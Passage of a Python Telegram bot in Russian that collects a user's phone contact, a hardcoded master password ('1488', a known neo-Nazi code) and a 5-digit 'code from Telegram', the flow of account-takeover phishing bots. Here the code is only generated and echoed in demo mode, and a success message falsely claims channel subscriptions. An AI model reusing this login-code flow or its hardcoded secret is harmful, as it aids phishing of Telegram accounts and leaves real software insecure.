#!/usr/bin/env python3
"""
Telegram Account Manager Bot (Russian Version)
Бот для управления Telegram аккаунтами
"""

import os
import asyncio
import logging
import sqlite3
import json
import random
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple, Any
from enum import Enum
import re

from dotenv import load_dotenv
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
)
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, ConversationHandler,
    filters
)

# Загрузка переменных окружения
load_dotenv()

# Конфигурация бота
BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_IDS = [int(id.strip()) for id in os.getenv('ADMIN_IDS', '').split(',') if id.strip()]
DATABASE_FILE = 'telegram_bot.db'
MASTER_PASSWORD = "1488"  # Мастер-пароль для входа

# Состояния диалога
class States(Enum):
    START = 0
    REQUEST_CONTACT = 1
    REQUEST_PASSWORD = 2
    REQUEST_CODE = 3
    MAIN_MENU = 4
    ADMIN_PANEL = 5
    ADD_CHANNEL = 6
    REMOVE_CHANNEL = 7
    ADD_BOT = 8
    REMOVE_BOT = 9
    VIEW_STATS = 10
    CHANNEL_MANAGEMENT = 11
    BOT_MANAGEMENT = 12

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Генератор кодов подтверждения
def generate_code() -> str:
    """Генерирует 5-значный код подтверждения"""
    return str(random.randint(10000, 99999))

# База данных
class Database:
    def __init__(self):
        self.conn = sqlite3.connect(DATABASE_FILE, check_same_thread=False)
        self.create_tables()
    
    def create_tables(self):
        cursor = self.conn.cursor()
        
        # Таблица пользователей
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                telegram_id INTEGER UNIQUE,
                phone_number TEXT,
                username TEXT,
                first_name TEXT,
                last_name TEXT,
                session_data TEXT,
                verification_code TEXT,
                code_expires TIMESTAMP,
                is_verified BOOLEAN DEFAULT 0,
                is_active BOOLEAN DEFAULT 1,
                password_attempts INTEGER DEFAULT 0,
                last_password_attempt TIMESTAMP,
                subscribed_channels TEXT DEFAULT '[]',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_active TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Таблица каналов
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS channels (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                channel_id TEXT UNIQUE,
                username TEXT UNIQUE,
                title TEXT,
                invite_link TEXT,
                is_active BOOLEAN DEFAULT 1,
                added_by INTEGER,
                added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                subscribers_count INTEGER DEFAULT 0
            )
        ''')
        
        # Таблица ботов
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS bots (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                bot_token TEXT UNIQUE,
                bot_username TEXT,
                bot_name TEXT,
                is_active BOOLEAN DEFAULT 1,
                added_by INTEGER,
                added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Таблица административных действий
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS admin_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                admin_id INTEGER,
                action TEXT,
                details TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        self.conn.commit()
    
    def add_user(self, telegram_id: int, username: str = None, 
                 first_name: str = None, last_name: str = None):
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT OR IGNORE INTO users 
            (telegram_id, username, first_name, last_name, created_at)
            VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
        ''', (telegram_id, username, first_name, last_name))
        
        cursor.execute('''
            UPDATE users SET 
            username = COALESCE(?, username),
            first_name = COALESCE(?, first_name),
            last_name = COALESCE(?, last_name),
            last_active = CURRENT_TIMESTAMP
            WHERE telegram_id = ?
        ''', (username, first_name, last_name, telegram_id))
        
        self.conn.commit()
        return cursor.lastrowid
    
    def check_password_attempts(self, telegram_id: int) -> bool:
        """Проверяет количество попыток ввода пароля"""
        cursor = self.conn.cursor()
        cursor.execute('''
            SELECT password_attempts, last_password_attempt 
            FROM users 
            WHERE telegram_id = ?
        ''', (telegram_id,))
        result = cursor.fetchone()
        
        if not result:
            return True
        
        attempts, last_attempt = result
        
        # Сбрасываем попытки если прошло больше 1 часа
        if last_attempt:
            last_attempt_time = datetime.fromisoformat(last_attempt)
            if datetime.now() - last_attempt_time > timedelta(hours=1):
                cursor.execute('''
                    UPDATE users SET 
                    password_attempts = 0,
                    last_password_attempt = NULL
                    WHERE telegram_id = ?
                ''', (telegram_id,))
                self.conn.commit()
                return True
        
        # Максимум 5 попыток
        return attempts < 5
    
    def increment_password_attempts(self, telegram_id: int):
        """Увеличивает счетчик попыток ввода пароля"""
        cursor = self.conn.cursor()
        cursor.execute('''
            UPDATE users SET 
            password_attempts = password_attempts + 1,
            last_password_attempt = CURRENT_TIMESTAMP
            WHERE telegram_id = ?
        ''', (telegram_id,))
        self.conn.commit()
    
    def reset_password_attempts(self, telegram_id: int):
        """Сбрасывает счетчик попыток"""
        cursor = self.conn.cursor()
        cursor.execute('''
            UPDATE users SET 
            password_attempts = 0,
            last_password_attempt = NULL
            WHERE telegram_id = ?
        ''', (telegram_id,))
        self.conn.commit()
    
    def set_user_verification_code(self, telegram_id: int, phone_number: str, code: str):
        cursor = self.conn.cursor()
        code_expires = datetime.now() + timedelta(minutes=10)
        cursor.execute('''
            UPDATE users SET 
            phone_number = ?,
            verification_code = ?,
            code_expires = ?,
            is_verified = 0
            WHERE telegram_id = ?
        ''', (phone_number, code, code_expires, telegram_id))
        self.conn.commit()
    
    def verify_user_code(self, telegram_id: int, code: str) -> bool:
        cursor = self.conn.cursor()
        cursor.execute('''
            SELECT verification_code, code_expires 
            FROM users 
            WHERE telegram_id = ? AND is_verified = 0
        ''', (telegram_id,))
        result = cursor.fetchone()
        
        if not result:
            return False
        
        stored_code, expires = result
        
        if datetime.now() > datetime.fromisoformat(expires):
            return False
        
        if stored_code == code:
            cursor.execute('''
                UPDATE users SET 
                is_verified = 1,
                verification_code = NULL,
                code_expires = NULL,
                last_active = CURRENT_TIMESTAMP
                WHERE telegram_id = ?
            ''', (telegram_id,))
            self.conn.commit()
            return True
        
        return False
    
    def get_user(self, telegram_id: int) -> Optional[Tuple]:
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM users WHERE telegram_id = ?', (telegram_id,))
        return cursor.fetchone()
    
    def get_all_users(self) -> List[Tuple]:
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM users ORDER BY created_at DESC')
        return cursor.fetchall()
    
    def get_active_users_count(self) -> int:
        cursor = self.conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM users WHERE is_active = 1')
        return cursor.fetchone()[0]
    
    def add_channel(self, channel_id: str, username: str, title: str, 
                    invite_link: str, added_by: int):
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO channels 
            (channel_id, username, title, invite_link, added_by, added_at)
            VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
        ''', (channel_id, username, title, invite_link, added_by))
        self.conn.commit()
        
        self.log_admin_action(added_by, "ADD_CHANNEL", 
                            f"Добавлен канал: {title} (@{username})")
        return cursor.lastrowid
    
    def get_all_channels(self) -> List[Tuple]:
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM channels WHERE is_active = 1 ORDER BY added_at DESC')
        return cursor.fetchall()
    
    def remove_channel(self, channel_id: str, removed_by: int):
        cursor = self.conn.cursor()
        cursor.execute('SELECT username, title FROM channels WHERE channel_id = ?', (channel_id,))
        channel = cursor.fetchone()
        
        cursor.execute('DELETE FROM channels WHERE channel_id = ?', (channel_id,))
        self.conn.commit()
        
        if channel:
            self.log_admin_action(removed_by, "REMOVE_CHANNEL",
                                f"Удален канал: {channel[1]} (@{channel[0]})")
    
    def add_bot(self, bot_token: str, bot_username: str, bot_name: str, added_by: int):
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO bots 
            (bot_token, bot_username, bot_name, added_by, added_at)
            VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
        ''', (bot_token, bot_username, bot_name, added_by))
        self.conn.commit()
        
        self.log_admin_action(added_by, "ADD_BOT",
                            f"Добавлен бот: {bot_name} (@{bot_username})")
        return cursor.lastrowid
    
    def get_all_bots(self) -> List[Tuple]:
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM bots WHERE is_active = 1 ORDER BY added_at DESC')
        return cursor.fetchall()
    
    def remove_bot(self, bot_token: str, removed_by: int):
        cursor = self.conn.cursor()
        cursor.execute('SELECT bot_username, bot_name FROM bots WHERE bot_token = ?', (bot_token,))
        bot = cursor.fetchone()
        
        cursor.execute('DELETE FROM bots WHERE bot_token = ?', (bot_token,))
        self.conn.commit()
        
        if bot:
            self.log_admin_action(removed_by, "REMOVE_BOT",
                                f"Удален бот: {bot[1]} (@{bot[0]})")
    
    def log_admin_action(self, admin_id: int, action: str, details: str):
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT INTO admin_logs (admin_id, action, details)
            VALUES (?, ?, ?)
        ''', (admin_id, action, details))
        self.conn.commit()
    
    def get_stats(self) -> Dict[str, Any]:
        cursor = self.conn.cursor()
        
        cursor.execute('SELECT COUNT(*) FROM users')
        total_users = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM users WHERE is_verified = 1')
        verified_users = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM channels')
        total_channels = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM bots')
        total_bots = cursor.fetchone()[0]
        
        cursor.execute('''
            SELECT COUNT(*) 
            FROM users 
            WHERE date(created_at) = date('now')
        ''')
        today_new = cursor.fetchone()[0]
        
        return {
            'total_users': total_users,
            'verified_users': verified_users,
            'total_channels': total_channels,
            'total_bots': total_bots,
            'today_new_users': today_new
        }
    
    def close(self):
        self.conn.close()

# Основной класс бота
class TelegramAuthBot:
    def __init__(self):
        self.db = Database()
        self.application = None
    
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Обработчик команды /start"""
        user = update.effective_user
        self.db.add_user(user.id, username=user.username, 
                        first_name=user.first_name, last_name=user.last_name)
        
        if user.id in ADMIN_IDS:
            # Администратор
            await self.show_admin_panel(update, context)
            return States.ADMIN_PANEL
        else:
            # Обычный пользователь
            keyboard = [
                [KeyboardButton("📱 Поделиться контактом", request_contact=True)],
                [KeyboardButton("❌ Отмена")]
            ]
            reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
            
            welcome_text = (
                "👋 *Добро пожаловать!*\n\n"
                "🔐 *Требуется авторизация*\n\n"
                "Нажмите кнопку ниже, чтобы поделиться контактом для входа в систему."
            )
            
            await update.message.reply_text(
                welcome_text,
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
            return States.REQUEST_CONTACT
    
    async def handle_contact(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Обработка поделенного контакта"""
        contact = update.message.contact
        
        if not contact:
            await update.message.reply_text(
                "❌ Не удалось получить контакт\n\n"
                "Пожалуйста, нажмите кнопку 'Поделиться контактом'",
                reply_markup=ReplyKeyboardRemove(),
                parse_mode='Markdown'
            )
            return States.REQUEST_CONTACT
        
        user = update.effective_user
        phone_number = contact.phone_number
        
        # Сохраняем номер телефона
        self.db.set_user_verification_code(user.id, phone_number, "")
        
        await update.message.reply_text(
            f"✅ Контакт получен: `{phone_number}`\n\n"
            "🔑 *Введите мастер-пароль для входа:*",
            reply_markup=ReplyKeyboardRemove(),
            parse_mode='Markdown'
        )
        
        return States.REQUEST_PASSWORD
    
    async def verify_password(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Проверка мастер-пароля"""
        user = update.effective_user
        password_input = update.message.text.strip()
        
        # Проверяем количество попыток
        if not self.db.check_password_attempts(user.id):
            await update.message.reply_text(
                "🚫 *Превышено количество попыток ввода пароля*\n\n"
                "Попробуйте через 1 час или обратитесь к администратору.",
                parse_mode='Markdown'
            )
            return ConversationHandler.END
        
        if password_input == MASTER_PASSWORD:
            # Пароль верный
            self.db.reset_password_attempts(user.id)
            
            # Генерация кода подтверждения
            verification_code = generate_code()
            self.db.set_user_verification_code(user.id, "", verification_code)
            
            await update.message.reply_text(
                "✅ *Пароль верный!*\n\n"
                "📲 *Отправляем код подтверждения...*\n\n"
                "🔢 *Введите 5-значный код из Telegram:*",
                parse_mode='Markdown'
            )
            
            # Демонстрационный код
            await update.message.reply_text(
                f"📟 *Демо-режим:* Ваш код: `{verification_code}`\n"
                "*Введите его в следующем сообщении*",
                parse_mode='Markdown'
            )
            
            return States.REQUEST_CODE
        else:
            # Неверный пароль
            self.db.increment_password_attempts(user.id)
            
            # Получаем информацию о попытках
            user_data = self.db.get_user(user.id)
            attempts = user_data[12] if user_data else 1
            
            remaining_attempts = 5 - attempts
            
            if remaining_attempts > 0:
                await update.message.reply_text(
                    f"❌ *Неверный пароль!*\n\n"
                    f"Осталось попыток: {remaining_attempts}\n"
                    f"Попытка №{attempts}\n\n"
                    "🔑 *Введите мастер-пароль еще раз:*",
                    parse_mode='Markdown'
                )
                return States.REQUEST_PASSWORD
            else:
                await update.message.reply_text(
                    "🚫 *Доступ заблокирован!*\n\n"
                    "Превышено максимальное количество попыток.\n"
                    "Попробуйте через 1 час.",
                    parse_mode='Markdown'
                )
                return ConversationHandler.END
    
    async def verify_code(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Проверка кода подтверждения"""
        user_input = update.message.text.strip()
        user = update.effective_user
        
        if not re.match(r'^\d{5}$', user_input):
            await update.message.reply_text(
                "❌ Неверный формат кода\n\n"
                "Введите 5-значный код:",
                parse_mode='Markdown'
            )
            return States.REQUEST_CODE
        
        if self.db.verify_user_code(user.id, user_input):
            # Получаем каналы для подписки
            channels = self.db.get_all_channels()
            
            success_message = "✅ *Аккаунт успешно подключен!*\n\n"
            
            if channels:
                channel_list = "\n".join([f"• {channel[3]}" for channel in channels[:3]])
                success_message += f"📢 *Подписан на каналы:*\n{channel_list}\n"
                if len(channels) > 3:
                    success_message += f"...и еще {len(channels) - 3} каналов\n"
            
            success_message += "\n🎉 *Теперь вы в системе!*"
            
            await update.message.reply_text(
                success_message,
                parse_mode='Markdown'
            )
            
            return await self.show_user_menu(update, context)
        else:
            await update.message.reply_text(
                "❌ *Неверный код подтверждения*\n\n"
                "Пожалуйста, проверьте код и попробуйте снова:",
                parse_mode='Markdown'
            )
            return States.REQUEST_CODE
    
    async def show_user_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Показывает меню пользователя"""
        keyboard = [
            [
                InlineKeyboardButton("📊 Статистика", callback_data="user_stats"),
                InlineKeyboardButton("📢 Каналы", callback_data="user_channels")
            ],
            [
                InlineKeyboardButton("🔄 Обновить", callback_data="refresh"),
                InlineKeyboardButton("⚙️ Настройки", callback_data="settings")
            ]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
